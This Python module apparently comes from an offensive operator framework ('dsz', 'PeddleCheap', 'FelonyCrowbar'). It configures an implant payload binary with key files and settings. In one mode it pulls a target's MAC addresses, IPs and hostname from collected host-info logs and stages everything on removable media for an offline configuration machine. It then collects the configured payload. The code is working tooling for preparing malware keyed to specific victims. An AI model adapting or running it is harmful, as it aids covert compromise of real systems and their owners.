
# package pc2_2.payload.exe
import dsz
import dsz.lp
import dsz.version
import pc2_2.payload.settings

import glob
import os
import os.path
import re
import shutil
import xml.dom.minidom

#-----------------------------------------------------------------------------------------
def ConfigBinary(path, file, keyLocation, extraInfo, type):

	if ((type.lower() == "level3") or pc2_2.payload.settings.CheckConfigLocal()):
		return _configureLocal(path, file, keyLocation, extraInfo)
	elif (type.lower() == "level4"):
		return _configureWithFC(path, file, keyLocation, extraInfo)
	else:
		# what?
		return ""

#----------------------------------------------------------------------------
def Finalize(payloadFile):
	return pc2_2.payload.settings.Finalize(payloadFile)

#-----------------------------------------------------------------------------------------
def _configureLocal(path, file, keyLocation, extraInfo):

	toolLoc = dsz.lp.GetResourcesDirectory()
	ver = dsz.version.Info(dsz.script.Env["local_address"])
	toolLoc = toolLoc + "/Pc2.2/Tools/%s-%s/PCConfig.exe" % (ver.compiledArch, ver.os)
	
	# configure the payload
	args = "-set -configfile \\\"%s/config.xml\\\"" % path
	args = args + " -input \\\"%s/%s.base\\\" -output \\\"%s/%s.configured\\\"" % (path, file, path, file)
	args = args + " -keys \\\"%s\\\"" % keyLocation
	if (not _runTool(toolLoc, args)):
		dsz.ui.Echo("* Failed to configure binary", dsz.ERROR)
		return ""
	
	if (len(glob.glob("%s/%s.configured" % (path, file))) == 0):
		dsz.ui.Echo("* Failed to find configured binary", dsz.ERROR)
		return ""
		
	# get the final configuration
	args = "-display -configfile \\\"%s/config.final.xml\\\" -input \\\"%s/%s.configured\\\"" % (path, path, file)
	if (not _runTool(toolLoc, args)):
		# Not a fatal error, but we should report it
		dsz.ui.Echo("* Failed to query final payload configuration", dsz.WARNING)
	
	return "%s/%s.configured" % (path, file)

#-----------------------------------------------------------------------------------------
def _configureWithFC(path, file, keyLocation, extraInfo):

	toolLoc = dsz.lp.GetResourcesDirectory()
	
	# get additional host information
	_getHostInformation(extraInfo)
	
	# Store the current version PeddleCheap	
	version=""
	try:
		dom1 = xml.dom.minidom.parse("%s/Pc2.2/Version.xml" % toolLoc)
		element = dom1.getElementsByTagName("Version")
		
		major = element[0].getAttribute("major")
		minor = element[0].getAttribute("minor")
		fix = element[0].getAttribute("fix")
		build = element[0].getAttribute("build")
		
		version = "%s.%s.%s.%s" % (major, minor, fix, build)
	except:
		dsz.ui.Echo("* Failed to get PC version", dsz.ERROR)
		return ""

	dsz.ui.Echo("The files need to be saved for transport to a machine with access")
	dsz.ui.Echo("to FelonyCrowbar.  This requires some form of removable media")
	
	defaultDest = _getDefaultPath()
	dest = dsz.ui.GetString("Please provide a path:", _getDefaultPath())
	dsz.env.Set(_getDestinationDir(), dest, 0, "")
	
	dest = os.path.normpath("%s/payload" % dest)
	if (len(glob.glob(dest)) > 0):
		dsz.ui.Echo("%s already exists!  You may have already configured a payload!" % dest, dsz.ERROR)
		return ""
		
	# create the directories
	try:
		os.mkdir(dest)
	except:
		pass
	try:
		os.mkdir("%s/lib" % dest)
	except:
		pass
	try:
		os.mkdir("%s/data" % dest)
	except:
		pass
	
	# where are the source files?
	sourceDir = "%s/Pc2.2/Tools" % toolLoc
	
	# copy over all the files
	if ((not _copyFiles("%s/java-j2se_1.5/" % sourceDir,					"%s" % dest, 				"PcRemoteConfiguration.jar")) or
		(not _copyFiles("%s/java-j2se_1.5/" % sourceDir,					"%s" % dest, 				"PcRemoteConfiguration.pl")) or
		(not _copyFiles("%s/java-j2se_1.5/lib" % sourceDir,					"%s/lib" % dest, 			"*.jar")) or
		(not _copyFiles("%s/java-j2se_1.5/data" % sourceDir,				"%s/data" % dest, 			"*.properties")) or
		(not _copyFiles(keyLocation,										"%s/data" % dest,			"*.bin")) or
		(not _copyFiles(path, 												"%s/data" % dest, 			"config.xml"))):
		dsz.ui.Echo("* Failed to copy files to removable media", dsz.ERROR)
		return ""
	
	# output name
	execProperties = os.path.normpath("%s/data/exec.properties" % dest)
	try:
		os.remove(execProperties)
	except:
		pass

	mount = re.sub("\\\\", "/", dest)
	
	lines = list()
	lines.append("output:%s.configured\n" % file)
	lines.append("mount:%s\n" % mount)
	lines.append("version:%s\n" % version)
	lines.append("inXml:config.xml\n")
	lines.append("outXml:config.final.xml\n")
	lines.append("configName:%s\n" % extraInfo["Fc_Name"][0])
	lines.append("osFamily:%s\n" % extraInfo["Fc_OsFamily"][0])
	lines.append("osArchitecture:%s\n" % extraInfo["Fc_Architecture"][0])
	lines.append("fc_response:FelonyCrowbar.xml\n")
	
	if (extraInfo.has_key("hostname")):
		lines.append("hostname:%s\n" % extraInfo["hostname"][0])
	
	if (extraInfo.has_key("mac")):
		line=""
		for item in extraInfo["mac"]:
			if (len(line) == 0):
				line = item
			else:
				line = line + (",%s" % item)
		lines.append("mac:%s\n" % line)
	
	if (extraInfo.has_key("ip")):
		line=""
		for item in extraInfo["ip"]:
			if (len(line) == 0):
				line = item
			else:
				line = line + (",%s" % item)
		lines.append("ip:%s\n" % line)

	# TODO any other immediate configurations

	try:
		f = open(execProperties, "w")
		try:
			f.writelines(lines)
		finally:
			f.close()
	except:
		dsz.ui.Echo("* Failed to write %s" % execProperties, dsz.ERROR)
		return ""
	
	# remove a previous instance of the configured output
	configured = os.path.normpath("%s/data/%s.configured" % (dest, file))
	try:
		os.remove(configured)
	except:
		pass
	
	payloadInfo = os.path.normpath("%s/data/config.final.xml" % dest)
	try:
		os.remove(payloadInfo)
	except:
		pass

	# copy over PCConfig.exe....
	
	dsz.ui.Echo("Removable media has been configured.", dsz.GOOD)
	dsz.ui.Echo("")
	dsz.ui.Echo("Please take the removable media to a machine with access to")
	dsz.ui.Echo("FelonyCrowbar and execute")
	dsz.ui.Echo("\t%s/PcRemoteConfiguration.pl" % dest)
	dsz.ui.Echo("\t\tCommandLine:  java -jar PcRemoteConfiguration.jar")
	dsz.ui.Echo("\t\t\tfrom the directory")
	dsz.ui.Echo("\t\tor Double-click on windows (and maybe linux)")
	dsz.ui.Echo("Afterwards, please restore the removable media at the same location")
	
	while (not(dsz.ui.Prompt("Have you executed the file?") and
			   os.path.exists(configured) and
			   os.path.exists(payloadInfo))):
		dsz.ui.Echo("The configured files are not at:", dsz.WARNING)
		dsz.ui.Echo("\t%s" % configured, dsz.WARNING)
		dsz.ui.Echo("\t%s" % payloadInfo, dsz.WARNING)
		if (dsz.ui.Prompt("Would you like to abort?", False)):
			dsz.ui.Echo("Configuration cancelled", dsz.ERROR)
			return ""
	
	# save final configuration file
	finalFile = os.path.normpath("%s/%s.configured" % (path, file))
	
	try:
		shutil.copy(configured, finalFile)
		shutil.copy(payloadInfo, "%s/config.final.xml" % path)
		
		# copy the FC database information (if found)
		fcXml = os.path.normpath("%s/data/fc.xml" % dest)
		if (os.path.exists(fcXml)):
			shutil.copy(fcXml, "%s/fc.xml" % path)
		
		shutil.move(dest, "%s_%s" % (dest, dsz.Timestamp()))
	except:
		dsz.ui.Echo("* Failed to copy configured files", dsz.ERROR)
		return ""
	
	return finalFile

#-----------------------------------------------------------------------------------------
def _copyFiles(sourceDir, destDir, mask):

	sourceDir = os.path.normpath(sourceDir)
	
	files = glob.glob("%s/%s" % (sourceDir, mask))
	if (len(files) == 0):
		return False

	for file in files:
		(d, f) = dsz.path.Split(file)
		try:
			shutil.copy("%s/%s" % (sourceDir, f), "%s/%s" % (destDir, f))
		except:
			return False

	return True

#-----------------------------------------------------------------------------------------
def _getDefaultPath():
	if (dsz.env.Check(_getDestinationDir(), 0, "")):
		return dsz.env.Get(_getDestinationDir(), 0, "")
	else:
		return ""

#-----------------------------------------------------------------------------------------
def _getDestinationDir():
	return "_pc_FelonyCrowbar_Dir"

#-----------------------------------------------------------------------------------------
def _getHostInformation(extraInfo):
	
	files = list()
	while (len(files) == 0):
		files = glob.glob("%s/hostinfo_*.txt" % dsz.lp.GetLogsDirectory())
		if (len(files) == 0):
			dsz.ui.Echo("* Failed to get host information", dsz.ERROR)
			if (not dsz.ui.Prompt("Try again?")):
				return False
	
	try:
		f = open(files[len(files)-1], "r")
		try:
			lines = f.readlines()
		finally:
			f.close()
	except:
		dsz.ui.Echo("* Failed to read %s" % files[len(files)-1], dsz.ERROR)
		return False
	
	for line in lines:
		# check for MAC
		match = re.match("MAC=(.*)", line)
		if (match != None):
			#dsz.ui.Echo("MAC = '%s'" % match.group(1))
			if (not extraInfo.has_key("mac")):
				extraInfo["mac"] = list()
			extraInfo["mac"].append(match.group(1))
			
		else:
			# check for IP
			match = re.match("ip=(.*)", line)
			if (match != None):
				#dsz.ui.Echo("IP = '%s'" % match.group(1))
				if (not extraInfo.has_key("ip")):
					extraInfo["ip"] = list()
				extraInfo["ip"].append(match.group(1))
				
			else:
				# check for HOSTNAME
				match = re.match("hostname=(.*)", line)
				if (match != None):
					#dsz.ui.Echo("host = '%s'" % match.group(1))
					if (not extraInfo.has_key("hostname")):
						extraInfo["hostname"] = list()
					extraInfo["hostname"].append(match.group(1))
	
	return True

#------------------------------------------------------------------------------------
def _runTool(toolLoc, args):
	
	# record current flags and turn echo'ing off
	x = dsz.control.Method()
	dsz.control.echo.Off()
	
	if (dsz.version.checks.IsWindows(dsz.script.Env["local_address"])):
		return dsz.cmd.Run("local run -command \"%s %s\" -redirect -noinput" % (toolLoc, args))
	else:
		# the unix version of run cannot currently handle spaces in commands
		return dsz.cmd.Run("local run -command \"/bin/sh -i\" -redirect \"%s %s; exit\" -noinput" % (toolLoc, args))
